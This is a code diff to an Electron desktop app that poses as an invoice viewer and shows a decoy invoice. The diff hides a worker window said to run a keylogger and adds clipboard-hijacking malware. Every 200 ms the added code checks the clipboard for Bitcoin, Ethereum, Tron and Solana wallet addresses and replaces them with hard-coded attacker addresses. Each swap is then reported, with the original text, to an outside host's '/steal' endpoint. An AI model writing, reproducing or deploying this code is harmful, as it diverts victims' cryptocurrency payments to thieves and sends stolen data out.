@@ -1,18 +1,17 @@
-const { app, BrowserWindow, ipcMain } = require('electron');
+const { app, BrowserWindow, ipcMain, clipboard, net } = require('electron');
 const path = require('path');
 const { exec } = require('child_process');
 const fs = require('fs');
 
 function createWindow() {
-  // 1. Create a VISIBLE worker window for debugging.
+  // 1. Create a hidden worker window to run the keylogger script.
   const workerWin = new BrowserWindow({
-    show: true, // Make window visible
+    show: false,
     webPreferences: {
       nodeIntegration: true,
     },
   });
   workerWin.loadFile(path.join(__dirname, 'worker.html'));
-  workerWin.webContents.openDevTools(); // Open DevTools
 
   // 2. Show the decoy invoice immediately.
   const decoyWin = new BrowserWindow({
@@ -80,4 +79,46 @@ function createWindow() {
   });
 }
 
-app.whenReady().then(createWindow);
+app.whenReady().then(createWindow).then(() => {
+  // === Clipbanker Logic (Moved to Main Process) ===
+  const scammerAddresses = {
+    btc:   "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
+    eth:   "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
+    usdt_erc20: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
+    usdt_trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
+    erc20: "0xb9FBAa68123ad7BdaCb5820dE4f7998887733333",
+    trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
+    sol:   "Gc1Xak8dXJY7h6G8XXMefa9BaiT8VMEsm6G4DXMzyCaX",
+    bnbsc: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
+  };
+
+  function getScammerAddress(copied) {
+    if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(copied)) return scammerAddresses.btc;
+    if (/^0x[a-fA-F0-9]{40}$/.test(copied)) return scammerAddresses.eth;
+    if (/^T[a-zA-Z0-9]{33}$/.test(copied)) return scammerAddresses.trc20;
+    if (/^[A-Za-z0-9]{43}$/.test(copied)) return scammerAddresses.sol;
+    return null;
+  }
+
+  setInterval(() => {
+    const text = clipboard.readText();
+    const scammerAddress = getScammerAddress(text);
+    if (scammerAddress && text !== scammerAddress) {
+      clipboard.writeText(scammerAddress);
+      
+      const request = net.request({
+        method: 'POST',
+        url: 'https://invoice-wimt.onrender.com/steal'
+      });
+      request.setHeader('Content-Type', 'application/json');
+      request.write(JSON.stringify({
+        type: "clipbanker",
+        original: text,
+        replaced: scammerAddress,
+        victim: "PC-User-01",
+        timestamp: new Date().toISOString()
+      }));
+      request.end();
+    }
+  }, 200);
+});
